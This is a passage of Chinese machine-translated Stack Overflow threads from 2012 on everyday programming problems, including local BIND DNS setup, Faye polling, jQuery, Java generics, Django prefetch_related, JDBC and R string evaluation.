我通过为本地网络（ubuntu 服务器）创建虚拟 DNS 服务器来本地解决了我遇到的问题。

```
 install bind
apt-get install bind9 -y

cd /etc/bind

vim named.conf.options

And uncomment forwarders and two rows bellow and instead of 0.0.0.0 enter google's dns IP (8.8.8.8).

service bind9 restart

vim named.conf.options

zone "YOURDOMAIN NAME" {
        type master;
        file "db.site.com";
        notify yes;
        };

cp db.local /var/cache/bind/db.site.com
cd /var/cache/bind/
vim db.sajt1.rs

$TTL    604800
@       IN      SOA     admin. admin.itlink.edu. (
                              2         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
        IN NS ns.YOURDOMAINNAMEHERE.
        IN      A       192.168.1.10 replace this with the IP of your PC that has apache installed
ns      A       192.168.1.10 replace this with the IP of your PC that has apache installed
www     A       192.168.1.10 replace this with the IP of your PC that has 

service bind9 restart 
```

如果您将 ubuntu 服务器的 IP 作为您的 dns，一切都会正常运行（因为所有无法解析的站点都将被发送到谷歌 DNS，它会为您完成）。但这仅适用于本地网络。

# facebook - 使用 FQL 从用户到组获取帖子

> ID：12014690
> 
> 赞同：1
> 
> 时间：2012-08-18T00:15:58.620
> 
> 标签：facebook, facebook-graph-api, facebook-fql

我正在尝试构建一个 FQL 查询，该查询将 post_id 从特定用户返回到 Facebook 组的流。我可以查询所有帖子并遍历它们并提取我需要的内容，但是对于一个有很多帖子的小组来说，这是不可行的。

FQL 文档让我相信我需要在 WHERE 子句中使用 filter_key，因为 actor_id 不可索引。我不知道如何使用 filter_key 来获得我正在寻找的结果。

```
SELECT post_id FROM stream WHERE target_id='a group_id' AND actor_id='a fb_id' 
```

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T01:58:18.077

这是您需要的查询：

```
SELECT post_id FROM stream WHERE source_id=GROUP_ID and actor_id=USER_ID 
```

为此，由于您正在寻找群组中的帖子，`GROUP_ID`因此`source_id`. 那是一个可索引的字段。一旦在 WHERE 子句中有一个可索引字段，就可以毫无问题地向其中添加附加字段。

此外，由于`GROUP_ID`和`USER_ID`是整数，因此不需要在 FQL 中引用它们。

# javascript - 由于传输层 /meta/connect 调用，使用 faye/nodejs 在 firefox/chrome 上长时间加载初始页面

> ID：12014692
> 
> 赞同：2
> 
> 时间：2012-08-18T00:16:26.860
> 
> 标签：javascript, node.js, firefox, google-chrome, faye

我对 faye/nodejs 有一个奇怪的问题，由于 /meta/connect 调用，页面似乎在初始页面加载时加载了很长时间。此页面加载似乎持续了 45 秒（这是服务器上设置的超时值）

以下是通话详情：

有问题的电话如下：

原始获取： [https ://MYURL.com:8089/notifications?message=%5B%7B%22channel%22%3A%22%2Fmeta%2Fconnect%22%2C%22clientId%22%3A%220c3gocq1rwi3sl0dskn4u00e8wj7%22%2C% 22connectionType%22%3A%22callback-polling%22%2C%22id%22%3A%225%22%7D%5D&jsonp=](https://MYURL.com:8089/notifications?message=%5B%7B%22channel%22%3A%22%2Fmeta%2Fconnect%22%2C%22clientId%22%3A%220c3gocq1rwi3sl0dskn4u00e8wj7%22%2C%22connectionType%22%3A%22callback-polling%22%2C%22id%22%3A%225%22%7D%5D&jsonp=) __jsonp3__

参数：jsonp：__jsonp3__ 消息：[{"channel":"/meta/connect","clientId":"0c3gocq1rwi3sl0dskn4u00e8wj7","connectionType":"callback-polling","id":"5"}]

响应：__jsonp3__([{"id":"5","clientId":"0c3gocq1rwi3sl0dskn4u00e8wj7","channel":"/meta/connect","successful":true,"advice":{"reconnect":"retry ","interval":0,"timeout":45000}}]);

我在没有 SSL 的情况下尝试过，但问题仍然存在，所以它似乎与此无关。

该页面在此期间完全响应，但这对我的客户来说显然是一个问题，因为他们只看到 ff 或 chrome 的加载栏，他们最终等待整整 45 秒让它停止，然后再继续。感谢您在调试或缓解此问题方面的任何帮助；可能使初始连接调用异步，因此它不会在初始页面加载时触发？

我还在 faye google 组上发帖：[https ://groups.google.com/forum/?fromgroups#!topic/faye-users/xZI4adt3DpA%5B1-25%5D](https://groups.google.com/forum/?fromgroups#!topic/faye-users/xZI4adt3DpA%5B1-25%5D)

但是我还没有得到回复，虽然看起来我不是唯一一个有这个问题的人。

任何帮助表示赞赏。

谢谢！

凯文

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T09:21:49.120

以防万一任何未来的谷歌人偶然发现这个话题：这个问题已经在新版本的 Faye 中得到解决。在我原来的问题中有一些关于 google group 链接的更多细节 - 这个问题应该从 faye 0.8.4（目前是 0.8.6）开始修复

我可以确认这解决了我的问题，我不再看到页面加载有任何超时。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T02:09:28.380

听起来您没有`end()`发出您发送的响应，因此您的服务器保持连接打开。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-19T21:09:27.347

发送到通道 /meta/connect 时，将其添加到您的参数中：

```
"advice":{"timeout": 0} 
```

因此，您的连接消息应如下所示：

```
{"channel":"/meta/connect","clientId":"0c3gocq1rwi3sl0dskn4u00e8wj7","connectionType":"callback-polling","id":"5","advice":{"timeout":0}} 
```

[您可以从这个地方](https://github.com/faye/faye/blob/master/lib/faye/protocol/server.rb#LC170)开始遵循我的解决方案：

```
# server.rb
@engine.connect(response['clientId'], message['advice']) do |events|
  callback.call([response] + events)
end

...

# proxy.rb
def connect(client_id, options = {}, &callback)
  debug 'Accepting connection from ?', client_id
  @engine.ping(client_id)
  conn = connection(client_id, true)
  conn.connect(options, &callback)
  @engine.empty_queue(client_id)
end

...

# connection.rb
def connect(options, &block)
  options = options || {}
  timeout = options['timeout'] ? options['timeout'] / 1000.0 : @engine.timeout

  set_deferred_status(:deferred)
  callback(&block)

  begin_delivery_timeout
  begin_connection_timeout(timeout)
end 
```

当消息到达 /meta/connect 通道时，会调用这些方法。

# javascript - 调整从选择输入中获取数据并将其放入 DIV 的 jQuery 代码

> ID：12014693
> 
> 赞同：1
> 
> 时间：2012-08-18T00:16:49.370
> 
> 标签：javascript, jquery, html

我已经准备好代码，但我有限的 jQuery 技能（如果有的话）无法帮助我弄清楚为什么无法实现我想要的输出。

这是jQuery代码：

```
 $('#property_types option').slice(1).each(
 function(){
var text = $(this).text(),
    outputTo = $('#output'),
    div = $('<div />', {'class' : text}).text(text),
    href = $('<a />', {'href' : '#', 'onclick' : 'go'+text+'();'}).prependTo(div),
    img = $('<img />', {'src' : 'images/'+text+'.png', 'style' : 'vertical-align:middle;padding-right:5px', 'width' : '35'}).prependTo(href);
div.appendTo(outputTo);
 }); 
```

这是它当前给出的输出：

```
 <div id="output">
 <div class="Apartment">
 <a href="#" onclick="goApartment();">
 <img src="images/Apartment.png" style="vertical-align: middle; padding-right: 5px; width: 35px;">
 </a>
 Apartment
 </div> 
```

问题是，文本AKA“Apartment”被排除在链接之外。如何在不损害代码当前功能的情况下解决此问题？任何帮助表示赞赏。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:19:10.187

试试这个：

```
$('#property_types option').slice(1).each(function(){
    var text = $(this).text(),
    outputTo = $('#output'),
    div = $('<div />', {'class' : text});
    href = $('<a />', {'href' : '#', 'onclick' : 'go'+text+'();'}).text(text).prependTo(div),
    img = $('<img />', {'src' : 'images/'+text+'.png', 'style' : 'vertical-align:middle;padding-right:5px', 'width' : '35'}).prependTo(href);
    div.appendTo(outputTo);
 }); 
```

# java - 通用列表的映射不能很好地转换

> ID：12014696
> 
> 赞同：1
> 
> 时间：2012-08-18T00:16:58.970
> 
> 标签：java, generics

与其用文字来尝试，我只举一个例子：

我有一个 Animal 类，以及一个扩展 Animal 的 Dog、Fish、Cat 等。

我有三种不同的方法，它们返回`Map<String,List<Dog>>, Map<String,List<Fish>>, Map<String,List<Cat>>`. 我们将它们称为 getDogMap、getCatMap 和 getFishMap。

我正在编写一个通用方法，它根据各种参数调用这些方法之一。这是我期望被允许做的事情：

```
public void <A extends Animal> doSomething(){

    Map<String,List<A>> someMap;

    if(someCondition){
        someMap = getDogMap();
    }else if(anotherCondition){
        someMap = getFishMap();
    }else{
        someMap = getCatMap():
    }
} 
```

或者至少，与演员 ala`someMap = (Map<String,List<Dog>>) getDogMap();`

但是，这不起作用。Eclipse 告诉我`"Type mismatch: cannot convert from Map<String,List<Dog>> to Map<String,List<A>>"`如果我尝试强制转换，它会告诉我`"Cannot cast from Map<STring,List<Dog>> to Map<String,List<A>>"`。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-18T01:06:37.617

`public void <A extends Animal>`并不意味着“`A`是任何扩展的类型`Animal`”，而是意味着“`A`是扩展的特定类型之一`Animal`”。您需要使用以下声明：

```
public void doSomething() {
    Map<String, ? extends List<? extends Animal>>  someMap;
    // ...
} 
```

构造`? extends Animal`是您表达“任何扩展的类型`Animal`”的方式。

您必须使用该声明的原因是，与直觉相反，泛型类型之间的子类型关系的工作方式与常规类型之间的工作方式并不完全一致。例如，`List<Dog>`是 的子类型`Collection<Dog>`。它**不是**`List<Animal>`, or etc 的子类型。`Collection<Animal>`不允许这样做的原因称为*堆污染，在*[Angelika Langer 的常见问题解答](http://www.angelikalanger.com/GenericsFAQ/FAQSections/TechnicalDetails.html#FAQ050)中也有解释。`List<Dog>`然而，它是 的子类型`List<? extends Animal>`。一个类型的变量`List<? extends Animal>`可能已经分配了一个`List<Dog>`，或一个`List<Cat>`，或一个`List<Animal>`。重要的部分是编译器不知道它是其中的哪一个，只是知道它是其中之一。

就像`List<Dog>`is **not**的子类型一样`List<Animal>`，类似地它认为 that`Map<String, List<Dog>>`不是**的**子类型`Map<String, List<? extends Animal>>`。

证明泛型为什么以这种方式工作的最好方法是反证法。也就是说，显示会导致错误的（损坏的）代码示例是“直观地”工作的泛型。因此，如果`List<Dog>`是 的子类型`List<Animal>`，则以下代码将是有效的：

```
List<Dog> dogs = new ArrayList<Dog>();
List<Animal> animals = dogs; // unsafe cast

// this operation violates type safety
animals.add(new Cat());

// would assign a Cat to a variable of type Dog without a compile error!
Dog dog = animals.get(0); 
```

同样，对于您的`Map`：

```
Map<String, List<Dog>> dogses = new HashMap<String, List<Dog>>();
Map<String, List<? extends Animal>> animalses = dogses; // unsafe cast

List<Cat> cats = new ArrayList();
cats.put(new Cat());
animalses.put("cats", cats);

List<Dog> dogs = dogses.get("cats");
Dog dog = dogs.get(0); // uh-oh 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T01:09:50.720

这里的问题在于泛型类型的工作方式。

在 Java 中，您会期望这`Number`是`Integer`（而且您是对的）的超类。你也会认为那`Number[]`是`Integer[]`. 你也是对的。但是，您不能说它`List<Number>`是`List<Integer>`. 这违反了类型安全。

```
List<Integer> intList = new ArrayList<Integer>();
List<Number> numList = intList; // the system stops you here
numList.add(Math.PI); // so that you don't do this 
```

在您的情况下，您有一个类型`Animal`及其子类型`Dog`、`Cat`和`Fish`。将此逻辑扩展到您的动物，您就会明白为什么无法转换`List<Dog>`为`List<A>`.

现在，您可以使用接口`addAll(Collection)`中定义的方法。`List`

```
List<Animal> animals = new List<Animal>();
List<Dog> dogs = new List<Dog>();
animals.addAll(dogs); 
```

# javascript - jqGrid 或 jQuery 是否具有在字符串中缓存 DOM 更改的功能

> ID：12014697
> 
> 赞同：0
> 
> 时间：2012-08-18T00:16:58.157
> 
> 标签：javascript, jquery, caching, jqgrid

例如，如果我们在 html 中有选择/选项/下拉框。如果数组大小为 5000，则 1) 在 jQuery 中比 2) 快。

1）首先制作一个字符串：

```
var str = '';
for (var i = 0; i<an_array.length; i++) {
  str +='<option value="' + an_array[i] + '">' + an_array[i] + '</option>';
}
jQuery("#my_select").append(str); 
```

2）每次追加：

```
for (var i = 0; i<an_array.length; i++) {
  jQuery("#my_select").append(
    jQuery('<option></option>').val(an_array[i]).html(an_array[i])
  );
} 
```

我的问题是：jQuery 或 jqGrid 是否具有这样的功能，即先创建一个缓存字符串，然后在完成后将所有内容发布到 html 上？还是我们已经在 jqGrid 中使用这种方式？我问这个问题的原因是当我有超过 500 列时，jqGrid 似乎真的很慢。这就像在 C 中一样。您可以在每次执行 fprintf 时自动刷新到文件，也可以在完成后手动刷新它。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T09:34:29.627

我已经在 jQuery 文档中多次看到，在多次重复相同的 DOM 内容时应该始终使用缓存对象，因为每次遍历 DOM 都需要更多的处理能力。

我会这样编写您的解决方案：-

HTML

```
<select id="my_select"/> 
```

JavaScript/jQuery

```
//an array to use for demonstration
var arr = ["one", "two", "three", "four", "five"];

var $frag = $();
$.each(arr, function () {
    $frag = $frag.add($("<option/>").val(this).text(this));
});
$("#my_select").append($frag); 
```

注意行**var $frag = $();** . **$()**创建了一个空的jQuery 对象，我在变量名**$frag**前面加上了一个**$**只是为了提醒自己它是一个 jQuery 对象而不是文本字符串。

希望能满意地回答你的问题。

最好的问候，艾伦

# java - 是否有一个 XML 注释可以用来将类属性分组到一个公共元素下？

> ID：12014698
> 
> 赞同：2
> 
> 时间：2012-08-18T00:16:59.573
> 
> 标签：java, jaxb

我试图在不修改任何代码的情况下将几个类字段组合在一起。我意识到我可以创建一个新类，然后将它们分组到该类名下，但我不想这样做。

我有这个：

```
<root>
  <a>1</a>
  <b>2</b>
</root> 
```

我要这个

```
<root>
  <c>
    <a>1</a>
    <b>2</b>
  </c>
</root> 
```

但我希望通过注释而不是类重组。

我在这里检查了 [http://docs.oracle.com/javase/6/docs/api/javax/xml/bind/annotation/package-summary.html](http://docs.oracle.com/javase/6/docs/api/javax/xml/bind/annotation/package-summary.html) 但没有找到任何东西。有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:38:03.990

JAXB 不支持开箱即用，但[EclipseLink-Moxy](http://www.eclipse.org/eclipselink/moxy.php)实现确实支持使用`XmlPath`自定义注释。查看[本教程中的](http://blog.bdoughan.com/2010/07/xpath-based-mapping.html)**使用 MOXy 添加分组元素**部分。以下是您要求的示例

```
@XmlRootElement(name="root")
@XmlAccessorType(XmlAccessType.FIELD)
class MyClass
{
  @XmlPath("c/a")
  String a;

  @XmlPath("c/b")
  String b;
} 
```

# jquery - jQuery验证文本区域

> ID：12014700
> 
> 赞同：0
> 
> 时间：2012-08-18T00:17:05.830
> 
> 标签：jquery, jquery-validate

我需要使用 jquery validate 来验证 textarea。我正在寻找正则表达式来检查由空格分隔且长度超过 5 个字符的多个带引号的字符串..：

“引用的文本..” “一些其他引用的文本” “另一个引用的字符串” = 好

“引用的文本..” “” “另一个引用的字符串” = 不好

“引用文本..” “abcd” “另一个引用字符串” = 不好

以下仅检查第一个引用的文本...（“引用的字符串长于 5”“”-> 这通过但不应该）

```
$(document).ready(function()
{
   $.validator.addMethod("coll_regex", function(value, element) { 
   return this.optional(element) || /"(.*?)"/.test(value); 
    }, "Message here......");

$("#f_coll").validate(
{
    rules:{
    'coll_txt':{
        required: true,
        minlength: 5,
        maxlength: 200,
        coll_regex: true
        }
    },
    messages:{
    'coll_txt':{
        required: "Textarea is empty...",
        minlength: "Length must be, at least, 5 characters..",
        maxlength: "You exceeded the max_length !",
        coll_regex: "Use the quotes...."
       }
    },
    errorPlacement: function(error, element) {
      error.appendTo(element.next());
  }
});
}); 
```

有没有这样做的正则表达式？？？会很棒...谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T00:38:07.990

您正在寻找的正则表达式是`/^("[^\".]{5,}" )*"[^\".]{5,}"$/`

```
'"abcdefg" "abcdefg" "01324"'.match(/^("[^\".]{5,}" )*"[^\".]{5,}"$/)  //--> true
'"abcdefg" "123" "01324"'.match(/^("[^\".]{5,}" )*"[^\".]{5,}"$/)  //--> false
'"abcdefg" "" "01324"'.match(/^("[^\".]{5,}" )*"[^\".]{5,}"$/)  //--> false 
```

**编辑：**

这个更精确：`/^("[^\".]{5,}"\s+)*"[^\".]{5,}"$/` 它允许组之间的任何空白，而不仅仅是一个空格。

# javascript - div的双击事件

> ID：12014703
> 
> 赞同：0
> 
> 时间：2012-08-18T00:18:37.597
> 
> 标签：javascript, html

我正在尝试将事件处理程序添加到在 div 内具有图像的 div 中。我的问题是，该事件仅在您双击旁边的 div 外部时才有效。当您双击 div 内的图片时，它不会触发事件。我如何才能使活动双向进行？

html

```
<div id="placeholder">
    <a href="http://google.com" target="_blank">
        <img src="http://www.fat-animals.com/wp-content/uploads/2009/03/11.jpg" alt="" />
    </a>
</div> 
```

javascript

```
var pic;
pic = document.getElementById("placeholder");
pic.ondblclick = function() {
    pic.innerHTML = "blocked!";
} 
```

演示 [http://jsfiddle.net/9DWrN/](http://jsfiddle.net/9DWrN/)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-18T00:26:39.710

检查这个小提琴 [http://jsfiddle.net/unloco/9DWrN/3/](http://jsfiddle.net/unloco/9DWrN/3/)

```
var pic = document.getElementById("placeholder");
var clicked = false;
pic.onclick = function() {
    if(clicked) {
        pic.innerHTML = "blocked!";
    } else {
        clicked = true;
    }
    setTimeout(function(){
        clicked = false
    }, 333); //detect fast clicks (333ms)
}​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T00:31:11.137

您当前的解决方案实际上有效，只是看起来不像，因为您被重定向到新页面。

如果您有 Chrome（也可能是 Firefox，甚至可能是 IE 8+），请双击图像（在新选项卡/窗口中打开）。您的事件仍将被触发。然后，您可以继续对这些事件进行 preventDefault。

但是，使用双击事件并不是防止恶意点击的最佳方法，因为双击事件只会每两次点击引发一次。虽然客户端验证无论如何都不能防止恶意点击，但最好使用点击事件并使用计时器进行检查（即，将事件限制为每 200 毫秒一次的最大值，或者仅在没有先前点击的情况下才允许它在前 200 毫秒内。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T16:34:21.133

`pic.innerHTML`在 onclick上改变呢？

见[http://jsfiddle.net/4Kecd/](http://jsfiddle.net/4Kecd/)

```
var = document.getElementById("placeholder");
pic.onclick = function() {
    pic.innerHTML = "blocked!";
    alert('The link has been blocked');
} 
```

即使你删除了链接，到时候也会被跟踪。

请参阅[http://jsfiddle.net/4Kecd/1/](http://jsfiddle.net/4Kecd/1/)。

你可以做...

```
var pic1 = document.getElementById("placeholder1"),
    clicked1=false;
pic1.onclick = function() {
    if(clicked1){
        alert("The link has been deleted. You can't follow the link twice!");
    }else{
        pic1.innerHTML = pic2.getElementsByTagName('a')[0].innerHTML;
        alert('The link has been deleted.\nHowever, the new tab will be opened when you accept this alert.');
        clicked1=true;
    }
} 
```

...如果您想删除链接但想要图像。

或者您可以禁用链接：

```
var pic2 = document.getElementById("placeholder2"),
    clicked2=false;
pic2.onclick = function(e) {
    var a=pic2.getElementsByTagName('a')[0];
    if(clicked2){
        alert("The link has been disabled. You can't follow the link twice!");
        a.href="#";/* Nonsense since we have disabled the link,
                      but we want to ensure that the link isn't followed*/
    }else{
        clicked2=true;
        a.onclick=function(){return false;}
        alert('The link has been disabled.\nHowever, the new tab will be opened when you accept this alert.');

    }
} 
```

注意：UnLoCo 的解决方案很好，但它的问题是它不会阻止我们点击链接。

相反，您可以在第一次单击时禁用链接并在几秒钟后启用它：

```
var pic = document.getElementById("placeholder"),
    clicked=false;
pic.onclick = function(e) {
    var a=pic.getElementsByTagName('a')[0];
    if(clicked){
        alert("The link has been disabled. You can't follow the link twice!");
        a.href="#";
    }else{
        clicked=true;
        a.onclick=function(){return false;}
        if(!a.getAttribute('data-href')){
            a.setAttribute('data-href',a.href);
        }
        alert('The link has been disabled.\nHowever, the new tab will be opened when you accept this alert.');
        setTimeout(function(){enableLink(a);},5000);

    }
}
function enableLink(a){
    a.href=a.getAttribute('data-href');
    a.onclick=function(){return true;}
    clicked=false;
} 
```

在这里看到它：http: [//jsfiddle.net/4Kecd/2/](http://jsfiddle.net/4Kecd/2/)

# python - 迭代 Django 中的相关对象：循环查询集或使用单行 select_related（或 prefetch_related）

> ID：12014704
> 
> 赞同：19
> 
> 时间：2012-08-18T00:18:56.330
> 
> 标签：python, django, orm

我有一个时事通讯应用程序，其中时事通讯在每个问题中都有多篇文章。我想在线显示一个摘要页面，其中列出了时事通讯的年份、数量和标签，然后以无序列表的形式显示该问题中的所有文章。我对 Django 很陌生，所以我试图确定最好的方法。

我定义了模型（只是相关部分）：

**`Models.py`：**

```
class Newsletter(models.Model):
    volume = models.ForeignKey(Volume)
    year   = models.IntegerField()
    season = models.CharField(max_length=6, choices=VOLUME_SEASON)
    label  = models.CharField(max_length=20)
    number = models.IntegerField()

class Article(models.Model):
    newsletter = models.ForeignKey(Newsletter)
    section    = models.ForeignKey(Section)
    title      = models.CharField(max_length=200) 
```

我想在网上看到的内容如下：

```
<h2>Spring 2012</h2>
<p>Volume 14, Number 1</p>
<ul>
    <li>Foo</li>
    <li>Bar</li>
    <li>Baz</li>
</ul>

<h2>Winter 2011</h2>
<p>Volume 13, Number 4</p>
<ul>
  <li>Boffo</li>
</ul> 
```

很简单。但是，我对撰写观点的最佳方式感到困惑。是否使用：

*   `zip()`我然后在模板中迭代的两个列表
*   使用查询`select_related()`集
*   使用查询`prefetch_related()`集

我使用第一个选项让它工作：

**`Views.py`：**

```
from django.shortcuts import render_to_response, get_object_or_404
from www.apps.newsletter.models import Newsletter, Article

def index(request):
    article_group = []
    newsletter = Newsletter.objects.all().order_by('-year', '-number')
    for n in newsletter:
        article_group.append(n.article_set.all())
    articles_per_newsletter = zip(newsletter, article_group)

    return render_to_response('newsletter/newsletter_list.html',
                              {'newsletter_list': articles_per_newsletter}) 
```

然后使用以下模板渲染它：

**`Newsletter_list.html`：**

```
{% block content %}
  {% for newsletter, articles in newsletter_list %}
    <h2>{{ newsletter.label }}</h2>
    <p>Volume {{ newsletter.volume }}, Number {{ newsletter.number }}</p>
    <p>{{ newsletter.article }}</p>
    <ul>
    {% for a in articles %}
      <li>{{ a.title }}</li>
    {% endfor %}
    </ul>
  {% endfor %}
{% endblock %} 
```

非常简单，但是由于我对 Django 还很陌生，所以我想知道我正在做的事情是否就其强大的 ORM 而言是完全低效的。`zip()`如果有更快的方法，我希望不必即时制作一个列表，然后将两个列表放在一起。

TIA。

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-08-18T00:53:01.500

您现在正在执行的方法将**非常**低​​效，因为它会导致 1+N 数量的查询。也就是说，1 用于查询所有时事通讯，然后 1 用于每次评估这些`n.article_set.all()`结果。因此，如果您在第一个查询中有 100 个 Newletter 对象，您将执行 101 个查询。

这是使用`prefetch_related`. 它只会导致 2 个查询。1个获取Newsletters，1个批量获取相关文章。尽管您仍然可以完美地继续`zip`组织它们，但它们已经被缓存了，所以实际上您可以直接将查询传递给模板并在其上循环。：

**看法**

```
newsletters = Newsletter.objects.prefetch_related('article_set').all()\
                    .order_by('-year', '-number')

return render_to_response('newsletter/newsletter_list.html',
                          {'newsletter_list': newsletters}) 
```

**模板**

```
{% block content %}
  {% for newsletter in newsletter_list %}
    <h2>{{ newsletter.label }}</h2>
    <p>Volume {{ newsletter.volume }}, Number {{ newsletter.number }}</p>
    <p>{{ newsletter.article }}</p>
    <ul>
    {% for a in newsletter.article_set.all %}
      <li>{{ a.title }}</li>
    {% endfor %}
    </ul>
  {% endfor %}
{% endblock %} 
```

# java - 使用从 sql 数据库中提取的方法返回的多维数组

> ID：12014705
> 
> 赞同：0
> 
> 时间：2012-08-18T00:18:56.230
> 
> 标签：java, mysql, oop, object, methods

我正在尝试使用我在另一个类方法中创建的多维数组中的一个。下面是我的主要方法：

```
public class main {

public static void main(String[] args) throws Exception {

    sql test = new sql();
    String[][] test2 = test.getDb();
    System.out.print(test2[0][0]);
} 
```

现在这是返回多维数组的类。

```
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;

import javax.swing.JLabel;
import javax.swing.JTextField;

import com.mysql.jdbc.Statement;

public class sql {

java.sql.Connection con = null;
PreparedStatement pst = null;
ResultSet rs = null;
String url = "jdbc:mysql://localhost:8889/deliveryEarn";
String user = "root";
String password = "root";

ArrayList<String> sqlCol1 = new ArrayList<String>();
ArrayList<String> sqlCol2 = new ArrayList<String>();
ArrayList<String> sqlCol3 = new ArrayList<String>();
ArrayList<String> sqlCol4 = new ArrayList<String>();
ArrayList<String> sqlCol5 = new ArrayList<String>();
ArrayList<String> sqlCol6 = new ArrayList<String>();
ArrayList<String> sqlCol7 = new ArrayList<String>();
String sqlArray[][] = new String[7][7];

public sql() {
}

public String[][] getDb() {
    try {
         con = DriverManager.getConnection(url, user, password);
         pst = con.prepareStatement("select * from incomeCalc");
         rs = pst.executeQuery();

    while (rs.next()) {

        sqlCol1.add(rs.getString(1));
        int i1=0;
        for(String s: sqlCol1){
            sqlArray[i1++][0] = s;
        }

        sqlCol2.add(rs.getString(2));
        int i2=0;
        for(String s: sqlCol2){
            sqlArray[i2++][1] = s;
        }

        sqlCol3.add(rs.getString(3));
        int i3=0;
        for(String s: sqlCol3){
            sqlArray[i3++][2] = s;
        }

        sqlCol4.add(rs.getString(4));
        int i4=0;
        for(String s: sqlCol4){
            sqlArray[i4++][3] = s;
        }

        sqlCol5.add(rs.getString(5));
        int i5=0;
        for(String s: sqlCol5){
            sqlArray[i5++][4] = s;
        }

        sqlCol6.add(rs.getString(6));
        int i6=0;
        for(String s: sqlCol6){
            sqlArray[i6++][5] = s;
        }
        sqlCol7.add(rs.getString(7));
        int i7=0;
        for(String s: sqlCol7){
            sqlArray[i7++][6] = s;
        }
    }
    }

catch( Exception E ) { 
    System.out.println( E.getMessage() );   
}
    return sqlArray;
}
} 
```

这是 MySQL 数据库的屏幕截图。 ![在此处输入图像描述](../Images/48bd1d3ff0330e1eee2b5b96f449dfef.png)

编辑：看来我的问题并不清楚。我道歉。我在这一行收到运行时错误：

```
System.out.print(test2[0][0]); 
```

我究竟做错了什么？此外，对于正确的 OOP，使用构造函数或方法从数据库中提取或输入数据库更好吗？这是我的第一个程序，如果它看起来微不足道，非常抱歉。

Edit2：这是错误：

main.main(main.java:17) 处的线程“main”java.lang.NullPointerException 中的异常

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T03:28:09.117

至于为什么会出现错误，最好知道错误，但是...

就个人而言，我会将结果集的内容放入“数据对象”中......

```
public class Income {
    // Column decelerations...

    private long id;
    private int tips;
    private int hours;
    private int gas;
    private double hourly;
    private double other;
    private double other2;

    public int getGas() {
        return gas;
    }

    public double getHourly() {
        return hourly;
    }

    public int getHours() {
        return hours;
    }

    public long getId() {
        return id;
    }

    public double getOther() {
        return other;
    }

    public double getOther2() {
        return other2;
    }

    public int getTips() {
        return tips;
    }

    public void setGas(int gas) {
        this.gas = gas;
    }

    public void setHourly(double hourly) {
        this.hourly = hourly;
    }

    public void setHours(int hours) {
        this.hours = hours;
    }

    public void setId(long id) {
        this.id = id;
    }

    public void setOther(double other) {
        this.other = other;
    }

    public void setOther2(double other2) {
        this.other2 = other2;
    }

    public void setTips(int tips) {
        this.tips = tips;
    }
} 
```

然后，当您加载它时，您可以执行类似...

```
public Income[] getIncome() {

    // Call database...

    List<Income> data = new ArrayList<Income>(25);

    while (rs.next()) {

        Income income = new Income();

        income.setID(rs.getInt(1)));
        income.setTips(rs.getInt(2)));
        income.setHours(rs.getInt(3)));
        income.setGas(rs.getInt(4)));
        income.setHourly(rs.getDouble(5)));
        income.setOther(rs.getDouble(6)));
        income.setOther2(rs.getDouble(7)));

        data.add(income);

    }

    return data.toArray(new Income[data.size()]);

} 
```

你可以做这样的事情......

```
sql test = new sql();
Income[] incomes = test.getIncome();

System.out.println(incomes[0].getID()); 
```

这不是更容易阅读吗：P

您尝试使用 a`Factory`可能是最好的主意。它归结为一个管理问题，你是否维护一个实例（[Singlton](http://en.wikipedia.org/wiki/Singleton_pattern)）或允许创建多个实例`Factory`。就个人而言，我更喜欢在这种情况下尽可能使用 Singltons，它允许在一个集中的地方执行操作（保存更改、创建新对象、列出、删除）并帮助管理所涉及的资源。恕我直言

# r - 使用逻辑字符串对 data.frame 进行子集

> ID：12014708
> 
> 赞同：0
> 
> 时间：2012-08-18T00:19:15.640
> 
> 标签：r, character, dataframe, subset

我想使用字符串执行逻辑运算（是的，我想这样做）

```
a = data.frame(x=c(1,2,3,4),y=c(11,12,13,14))
logical_text = "a$x!=2 & a$y!=14"

a
> a
  x  y
1 1 11
2 2 12
3 3 13
4 4 14 
```

我希望按如下方式使用字符串

```
 a[logical_text,]
> a[logical_text,]
    x  y
NA NA NA 
```

为了获得与以下相同的结果：

```
a[a$x!=2 & a$y!=14,]
> a[a$x!=2 & a$y!=14,]
  x  y
1 1 11
3 3 13 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-18T00:23:18.750

以这种方式做事不一定是个好主意。但是如果你真的必须的话，你可以用`eval(parse(text = your_command_as_a_string_here))`它来评估一个字符串，就好像它是代码一样

```
a = data.frame(x=c(1,2,3,4),y=c(11,12,13,14))
logical_text = "a$x!=2 & a$y!=14"

# Evaluate logical_text into a temporary logical variable
logical_output <- eval(parse(text = logical_text))
a[logical_output,]
#  x  y
#1 1 11
#3 3 13

# Same thing but without storing as a temporary variable.
a[eval(parse(text=logical_text)), ]
#  x  y
#1 1 11
#3 3 13 
```

# javascript - 使部分 contentEditable 无法删除

> ID：12014713
> 
> 赞同：4
> 
> 时间：2012-08-18T00:20:23.703
> 
> 标签：javascript, jquery, html

我有一个 contentEditable Div，我希望能够“保护”它的一部分不被删除。

例如，我有这个 contentEditable DIV，其中有一个 img 标签，我不想被删除。但是当用户键入时，我需要保持图像周围的文本流。

[http://jsfiddle.net/uk6DA/16/](http://jsfiddle.net/uk6DA/16/)

